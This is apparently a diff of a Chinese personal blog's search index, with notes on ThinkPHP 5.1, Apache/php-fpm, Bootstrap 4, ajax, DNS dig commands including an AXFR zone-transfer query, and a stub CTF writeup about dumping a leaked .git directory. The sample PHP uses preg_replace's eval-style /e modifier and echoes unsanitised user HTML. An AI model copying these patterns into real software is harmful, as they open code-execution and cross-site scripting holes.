@@ -34,6 +34,64 @@
       </categories>
   </entry>
   <entry>
+    <title>2018-寒假学习记录</title>
+    <url>/2018-%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="寒假学习记录">2018-寒假学习记录</h1>
+<h3 id="假期学习了">假期学习了</h3>
+<ul>
+<li>Thinkphp5.1</li>
+<li>Bootstrap4</li>
+<li>jquery ajax</li>
+<li>markdown</li>
+</ul>
+<h2 id="section"><a id="more"></a></h2>
+<h4 id="便于爬虫识别的html标签">便于爬虫识别的html标签</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section定义 </span><br><span class="line">	用来区分各板块</span><br><span class="line">header main footer为方便爬虫检索</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table定义</span><br><span class="line"></span><br><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Month&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th&gt;Savings&lt;&#x2F;th&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;January&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;$100&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div 背景图片自适应显示</span><br><span class="line">	background-image: url(..&#x2F;imgs&#x2F;footerkuang.png);</span><br><span class="line">    background-repeat: no-repeat;     &#x2F;&#x2F;无重复</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    -moz-background-size: 100% 100%;</span><br><span class="line">	</span><br><span class="line">图片自适应div大小 </span><br><span class="line">	可重复</span><br><span class="line">	background-size:contain</span><br></pre></td></tr></table></figure>
+<h4 id="thinkphp5.1">ThinkPhp5.1</h4>
+<ol type="1">
+<li>在linux下,需要权限php程序才能运行php文件,所以需要<code>chown apache2.apache2 /var/html/tp5/runtime -R</code> 递归修改tp5下的runtime目录</li>
+<li>在linux下,使用文件上传,应该给tp5目录下的public/upload目录apapche用户权限,否则无法上传文件.</li>
+<li>在linux下,需要额外安装php7.2-mysql,否则会产生无法访问数据库的错误.</li>
+<li>linux配置php-fpm时,使用sock连接fpm时应该这么写</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        DocumentRoot &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;                        </span><br><span class="line">        ServerName www.divint3.com            </span><br><span class="line">        ServerAlias divint3.com               </span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line">  &lt;Directory &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI &#x2F;&#x2F;禁止访问目录,允许在该目录下执行CGI脚本</span><br><span class="line">        AllowOverride All &#x2F;&#x2F;允许rewrite,根据htc</span><br><span class="line">        Order allow,deny &#x2F;&#x2F;设置缺省的访问权限与Allow和Deny语句的处理顺序</span><br><span class="line">        Allow from all &#x2F;&#x2F;允许从任何地址访问</span><br><span class="line">        Require all granted &#x2F;&#x2F;允许所有请求访问资源</span><br><span class="line">        Satisfy all &#x2F;&#x2F;禁止直接访问</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^&#x2F;(.*\.php(&#x2F;.*)?)$ unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock|fcgi:&#x2F;&#x2F;localhost&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&#x2F;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+<p>最后用phpinfo()验证是否开启php-fpm成功</p>
+<ol start="5" type="1">
+<li>linux下apache开启模块 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br></pre></td></tr></table></figure></li>
+<li>想要隐藏url的php文件名,应该编辑.<strong>htaccess</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  &#x2F;&#x2F;以上为默认配置文件</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">  &#x2F;&#x2F;写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure></li>
+<li>本来要自己写分页操作的,没想到tp5自己有分页操作,语法 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bkList</span><span class="params">($type)</span></span>&#123;</span><br><span class="line">    $info=Bkarticle::where(<span class="string">"type"</span>,$type)-&gt;paginate(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 获取分页显示</span></span><br><span class="line">    $page = $info-&gt;render();</span><br><span class="line">    <span class="comment">// 模板变量赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'info'</span>, $info);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'page'</span>, $page);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> Bkartical为数据库中的同名表.可用于查询数据库中的同名表.<code>paginate(10)</code>的意思是每页显示十条数据. 这是tp5中的模型操作数据库. <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;extend name="./common/father" /&#125; //继承父模板</span><br><span class="line"></span><br><span class="line">&#123;block name="title"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>灾害大百科<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="content"&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"text-center table  table-bordered"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章内容预览<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;volist name='info' id='bklist' length="50"&#125;</span><br><span class="line">            &#123;php&#125;</span><br><span class="line">                $content=$bklist["content"];</span><br><span class="line">                preg_replace('/<span class="tag">&lt;<span class="name">\s*img\s+[^</span>&gt;</span>]*?src\s*=\s*(\'|\")(.*?)\\1[^&gt;]*?\/?\s*&gt;/i','[图片]',$content); //把数据库中取出的html文本数据中的匹配img标签的文本替换为[img],因为这这只是一个预览内容,不能把整个img文件链接地址暴露出来</span><br><span class="line">                preg_replace('/(<span class="tag">&lt;/<span class="name">?)(w+)([^</span>&gt;</span>]*&gt;)/e', "'\1'.strtoupper('\2').'\3'", $content); //替换掉所有标签,只保留文本内容</span><br><span class="line">                $content=substr($content,0,100); //截取100的长度</span><br><span class="line">            &#123;/php&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/bkarticle/&#123;$bklist.id&#125;"</span>&gt;</span>&#123;$bklist.title&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"text-left"</span>&gt;</span>&#123;php&#125;echo $content;&#123;/php&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;/volist&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"float-right"</span>&gt;</span>&#123;$info|raw&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //这里输出分页表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="js"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/baike/bklist.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure> 使用jquery为对象添加class,因为{$info|raw}输出的是一个html代码,而这个代码不法修改,只能用jquery确定元素,增加class <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(function () &#123;</span><br><span class="line">    $(&quot;main section div div ul li&quot;).addClass(&quot;page-item&quot;);</span><br><span class="line">    $(&quot;main section div div ul span&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">    $(&quot;main section div div ul li a&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure> 分页效果如下 <img src="/uploads/fzcms.png" alt="分页" /></li>
+<li>phpstrom在linux下有个东西不知道怎么取消,反正就是根据是否使用git提交文件的颜色会有变化,其实只要Alt+F12 用git同步就行了,一个add,一个comment颜色就没啦,这种颜色不一样保持了我这个强迫症不断备份啊.红色是未提交,绿色是新添加,蓝色是已修改</li>
+</ol>
+<p>9.PHP版本过高会使tp5无法连接数据库,在尝试数据库迁移时,会报错<code>SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client</code>发生这种错误，是由于MySQL 8默认使用了新的密码验证插件：caching_sha2_password，而之前的PHP版本中所带的mysqlnd无法支持这种验证。</p>
+<p>修改 /etc/mysql/my.cnf，添加下面一行： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin&#x3D; mysql_native_password</span><br></pre></td></tr></table></figure> 然后重置密码： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER USER &#39;user&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;</span><br></pre></td></tr></table></figure> ---</p>
+<h4 id="简单的ajax.post">简单的ajax.post</h4>
+<ol type="1">
+<li>首先说说a标签如何触发onclick事件</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">onclick</span>=<span class="string">"js_method()"</span>&gt;</span>Some Thing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里herf超链接指向了一个空的js脚本,然后定义onclick事件 这样,我们可以使用a标签使用onclick事件发送一个ajax请求 定义一个类 叫做upload,创建一个方法,用来接收数据,这里在js处理完数据后,php仍然会检验数据可用性,我把它定义在了<strong>admin/bkadd/addcheck</strong>下, <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 前端文章上传类</span></span><br><span class="line"><span class="comment">* @author Divint3</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upload = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> type = $(<span class="string">'input[name="type"]:checked'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> title = $(<span class="string">'input[name="title"]'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> content = editor.txt.html();<span class="comment">//获取各种值并定义变量</span></span><br><span class="line">        <span class="keyword">if</span> (content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"内容不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!title) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"标题不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"未指定文章类型"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">"admin/bkadd/addcheck"</span>;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="string">"type"</span>: type,</span><br><span class="line">            <span class="string">"title"</span>: title,</span><br><span class="line">            <span class="string">"content"</span>: content,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $.post(url, data, <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;<span class="comment">//result是admin/bkadd/addcheck返回的json数据</span></span><br><span class="line">            <span class="keyword">if</span> (result.status) &#123;<span class="comment">//status返回的是php检验数据是否成功,检验数据成功后,tp5助手函数db会返回一个非零数值,如果插入失败,返回零</span></span><br><span class="line">                dialog.success(result.message);<span class="comment">//dialog封装了layer弹出层的方法,方便调用</span></span><br><span class="line">                editor.txt.html(<span class="string">'&lt;p&gt;&lt;br&gt;&lt;/p&gt;'</span>);</span><br><span class="line">                $(<span class="string">'input[name="title"]'</span>).val(<span class="string">""</span>);<span class="comment">//数据信息清空</span></span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                dialog.error(result.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"JSON"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>PHP检验代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里接收ajax请求,处理请求</span></span><br><span class="line">        $type = $_POST[<span class="string">'type'</span>];</span><br><span class="line">        $title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">        $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!$type) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'未指定文章类型'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'标题不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'内容不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [</span><br><span class="line">            <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">            <span class="string">"title"</span> =&gt; $title,</span><br><span class="line">            <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $isset = Bkarticle::where(<span class="string">"title"</span>, $title)-&gt;find();</span><br><span class="line">        <span class="keyword">if</span> ($isset == <span class="keyword">array</span>()) &#123;</span><br><span class="line">            $s = db(<span class="string">"bkarticle"</span>)-&gt;data($data)-&gt;insert();</span><br><span class="line">            <span class="keyword">return</span> show($s, <span class="string">"插入百科文章成功"</span>, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">                <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">"这个文章名已经被用过了"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的show方法我定义在了application下的comment.php下,因为这里是公共方法,所有方法都可以引用 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($status, $message, $data = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result=[</span><br><span class="line">        <span class="string">'status'</span>=&gt;$status,</span><br><span class="line">        <span class="string">'message'</span>=&gt;$message,</span><br><span class="line">        <span class="string">'data'</span>=&gt;$data,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">exit</span>(json_encode($result));</span><br><span class="line">&#125;<span class="comment">//就是返回了一个json,给使用ajax.post方法的一个result,这样js才能处理插入状态</span></span><br></pre></td></tr></table></figure></p>
+<hr />
+<h4 id="bootstrap4">bootstrap4</h4>
+<ol type="1">
+<li>使用bs4的原因是他的排版和配色真的好看,给大家一个bs4主题链接https://bootswatch.com/ ,配色什么的方案多样.</li>
+<li>bs4的栅格结构也很好,支持动态响应.反正我现阶段是写不出来.</li>
+<li>bs4没啥好说的,就是个css加js,调用就完事了. 常用知识点 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">容器</span><br><span class="line">	container 类用于固定宽度并支持响应式布局的容器。</span><br><span class="line">	container-fluid 类用于 100% 宽度，占据全部视口（viewport）的容器</span><br><span class="line">颜色操作 bg-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">	</span><br><span class="line">前景色 text-</span><br><span class="line"></span><br><span class="line">字体位置</span><br><span class="line">	text-center&#x2F;left&#x2F;right</span><br><span class="line">	font-weight-normal 普通</span><br><span class="line">				-bold 加粗</span><br><span class="line">英文变换</span><br><span class="line">	text-lowercase 小写</span><br><span class="line">		-uppercase 大写</span><br><span class="line">		-capitalize 自动大小写</span><br><span class="line">字体大小 display-</span><br><span class="line">	display-1 最大</span><br><span class="line">			-2</span><br><span class="line">			-3</span><br><span class="line">			-4 最小</span><br><span class="line"></span><br><span class="line">网格系统 col-</span><br><span class="line">	一共划分为12个网格</span><br><span class="line">	.col- 针对极小屏幕</span><br><span class="line">	.col-sm- 平板 - 屏幕宽度等于或大于 576px</span><br><span class="line">	.col-md- 桌面显示器 - 屏幕宽度等于或大于 768px)</span><br><span class="line">	.col-lg- 大桌面显示器 - 屏幕宽度等于或大于 992px)</span><br><span class="line">	.col-xl- 超大桌面显示器 - 屏幕宽度等于或大于 1200px)</span><br><span class="line">	</span><br><span class="line">	xl与lg同时存在,若大于xl判定,使用xl规则,大于lg小于xl,使用lg规则,以此类推</span><br><span class="line">	只定义了col-md 那么md及md以上使用md的规则,md以下使用默认规则</span><br><span class="line">	</span><br><span class="line">	offset-</span><br><span class="line">		偏移系统,指定偏移多少单位,最高12</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">余白与边框 </span><br><span class="line">	padding 余白</span><br><span class="line">	margin 边框</span><br><span class="line">	写法</span><br><span class="line">		p&#x2F;m&#123;location&#x3D;t[op]b[lod]l[eft]r[ight]xy&#125;-size</span><br><span class="line">		x代表上下</span><br><span class="line">		y代表左右</span><br><span class="line">	size定义值</span><br><span class="line">		1 0.25rem</span><br><span class="line">		2 0.5rem</span><br><span class="line">		3 1rem</span><br><span class="line">		4 1.5rem</span><br><span class="line">		5 3rem</span><br><span class="line">	maigin在class中定义</span><br><span class="line">		margin-tblr:#px %</span><br><span class="line">	        &#123;margin-left: auto;</span><br><span class="line">            margin-right: auto;&#125;代表水平居中</span><br><span class="line">			</span><br><span class="line">按钮定义 btn-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">定义行 row</span><br><span class="line">显示顺序 order	</span><br><span class="line">	order-屏幕尺寸-顺序值</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr />
+<h4 id="layer弹出层">layer弹出层</h4>
+<p>这就是个充数的,调用看官网就行了.</p>
+<hr />
+<h4 id="markdown">MarkDown</h4>
+<p>同上</p>
+]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+  </entry>
+  <entry>
     <title>51例程</title>
     <url>/51%E4%BE%8B%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="背景知识">背景知识</h2>
@@ -49,6 +107,26 @@
 ]]></content>
       <categories>
         <category>单片机</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ARM-相关知识及传送门</title>
+    <url>/ARM-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%8F%8A%E4%BC%A0%E9%80%81%E9%97%A8/</url>
+    <content><![CDATA[<h3 id="portal">Portal</h3>
+<p><a href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener">官方介绍</a> <a href="https://blog.csdn.net/MyArrow/article/details/9701499" target="_blank" rel="noopener">CPSR/SPSR</a> <a href="https://blog.csdn.net/caihaitao2000/article/details/84843270" target="_blank" rel="noopener">异常处理</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/81906495" target="_blank" rel="noopener">arm架构64位入门基础：架构分析、寄存器、调用规则、指令集、程序调试以及参考手册</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/82530435" target="_blank" rel="noopener">arm架构64位（AArch64）汇编优化总结</a></p>
+]]></content>
+      <categories>
+        <category>ARM</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Dns服务相关</title>
+    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
+<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
+]]></content>
+      <categories>
+        <category>运维</category>
       </categories>
   </entry>
   <entry>
@@ -871,16 +949,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ARM-相关知识及传送门</title>
-    <url>/ARM-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%8F%8A%E4%BC%A0%E9%80%81%E9%97%A8/</url>
-    <content><![CDATA[<h3 id="portal">Portal</h3>
-<p><a href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener">官方介绍</a> <a href="https://blog.csdn.net/MyArrow/article/details/9701499" target="_blank" rel="noopener">CPSR/SPSR</a> <a href="https://blog.csdn.net/caihaitao2000/article/details/84843270" target="_blank" rel="noopener">异常处理</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/81906495" target="_blank" rel="noopener">arm架构64位入门基础：架构分析、寄存器、调用规则、指令集、程序调试以及参考手册</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/82530435" target="_blank" rel="noopener">arm架构64位（AArch64）汇编优化总结</a></p>
-]]></content>
-      <categories>
-        <category>ARM</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Thunderbird配置自动代理PAC</title>
     <url>/Thunderbird%E9%85%8D%E7%BD%AE%E8%87%AA%E5%8A%A8%E4%BB%A3%E7%90%86PAC/</url>
     <content><![CDATA[<h3 id="自动配置代理链接">自动配置代理链接</h3>
@@ -888,6 +956,15 @@
 ]]></content>
       <categories>
         <category>链接</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>akonadi-提示无法连接数据库</title>
+    <url>/akonadi-%E6%8F%90%E7%A4%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p>缺少依赖,安装 <strong>akonadi-backend-mysql</strong></p>
+]]></content>
+      <categories>
+        <category>answer&amp;question</category>
       </categories>
   </entry>
   <entry>
@@ -1529,22 +1606,32 @@
       </categories>
   </entry>
   <entry>
-    <title>Dns服务相关</title>
-    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
-    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
-<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
-]]></content>
-      <categories>
-        <category>运维</category>
-      </categories>
-  </entry>
-  <entry>
     <title>sql注入-拼接注入</title>
     <url>/sql%E6%B3%A8%E5%85%A5-%E6%8B%BC%E6%8E%A5%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>git泄露,用Git_Assemble拖下来 获得源码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
         <category>writeup</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>thinkphp-安装使用</title>
+    <url>/thinkphp-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h3 id="安装过程">安装过程</h3>
+<h4 id="安装composer">安装composer</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php -r "copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line"><span class="comment"># php composer-setup.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="移动到path下的路径">移动到$PATH下的路径</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mv composer.phar /usr/local/bin/composer</span></span><br></pre></td></tr></table></figure>
+<h4 id="切换国内镜像">切换国内镜像</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org(稳定可用)</span></span><br></pre></td></tr></table></figure>
+<h4 id="安装thinkphp到tp5目录下">安装thinkphp到tp5目录下</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer create-project topthink/think tp5</span></span><br></pre></td></tr></table></figure>
+<h4 id="安装migration应该在tp5目录下执行">安装migration,应该在tp5目录下执行</h4>
+<p><strong>tp5只支持2.x的migration</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer require topthink/think-migration "2.x"</span></span><br></pre></td></tr></table></figure></p>
+<p>下载bootstrap layui wangeditor这些开源实现</p>
+]]></content>
+      <categories>
+        <category>编程</category>
       </categories>
   </entry>
   <entry>
@@ -1737,23 +1824,122 @@
       </categories>
   </entry>
   <entry>
-    <title>thinkphp-安装使用</title>
-    <url>/thinkphp-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h3 id="安装过程">安装过程</h3>
-<h4 id="安装composer">安装composer</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php -r "copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line"><span class="comment"># php composer-setup.php</span></span><br></pre></td></tr></table></figure>
-<h4 id="移动到path下的路径">移动到$PATH下的路径</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mv composer.phar /usr/local/bin/composer</span></span><br></pre></td></tr></table></figure>
-<h4 id="切换国内镜像">切换国内镜像</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org(稳定可用)</span></span><br></pre></td></tr></table></figure>
-<h4 id="安装thinkphp到tp5目录下">安装thinkphp到tp5目录下</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer create-project topthink/think tp5</span></span><br></pre></td></tr></table></figure>
-<h4 id="安装migration应该在tp5目录下执行">安装migration,应该在tp5目录下执行</h4>
-<p><strong>tp5只支持2.x的migration</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer require topthink/think-migration "2.x"</span></span><br></pre></td></tr></table></figure></p>
-<p>下载bootstrap layui wangeditor这些开源实现</p>
+    <title>微积分的本质</title>
+    <url>/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
